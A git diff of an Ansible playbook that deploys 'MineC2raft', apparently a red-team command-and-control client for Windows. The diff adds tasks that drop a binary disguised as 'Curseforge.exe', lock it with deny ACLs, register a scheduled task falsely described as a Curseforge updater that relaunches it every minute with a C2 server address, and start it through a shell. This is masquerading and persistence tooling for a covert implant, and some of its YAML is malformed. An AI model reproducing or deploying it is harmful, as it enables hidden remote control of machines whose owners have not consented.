@@ -1,17 +1,4 @@
-#####################################################################################
-#####                        MINEC2RAFT - Windows Edition                       #####
-##### Author: Austin Hall                                                       #####
-##### If ur not RIT Red team, don't use!!!!!                                    #####
-##### (pls and thanku :) )                                                      #####
-#####################################################################################
-
 ---
-- name: "Deploy MineC2raft Client" 
-  vars:
-      client_source: ""
-      base_dir: "{{ ansible_user_dir }}" 
-      server_ip: "0.0.0.0/55565"
-
 - name: "Create Curseforge Directories"
   ansible.windows.win_file:
   path: "{{ item }}"
@@ -29,8 +16,8 @@
 
 - name: "Send Client configuration"
   ansible.windows.win_copy:
-  src: "{{ client_source }}" 
-  dest: "{{ base_dir }}\\Curseforge\\minec2raft\\Install\\file.conf"
+  src: "{{ deploy_source }}" 
+  dest: "{{ base_dir }}\\Curseforge\\minec2raft\\Install\\Curseforge.exe"
   when: ansible_os_family == 'Windows'
 
 - name: "Set ACL for client"
@@ -41,3 +28,22 @@
   type: deny
   state: "present"
   when: ansible_os_family == 'Windows'
+
+- name: Create Scheduled Task
+  community.windows.win_scheduled_task:
+    name: Curseforge Updater
+    description: Updates the Curseforge Mod Client.
+    actions:
+    - path: "{{ base_dir }}/curseforge/minec2raft/Install/Curseforge.exe"
+      arguments: "{{server_ip}}"
+    triggers:
+    - type: registration
+      interval: PT1M
+      duration: 1D
+    start_when_available: true
+    compatibility: 4
+  when: ansible_os_family == windows
+
+- name: Start Curseforge
+  win_shell: ./{{ base_dir }}/curseforge/minec2raft/Install/Curseforge.exe {{ server_ip }}
+  when: ansible_os_family == windows
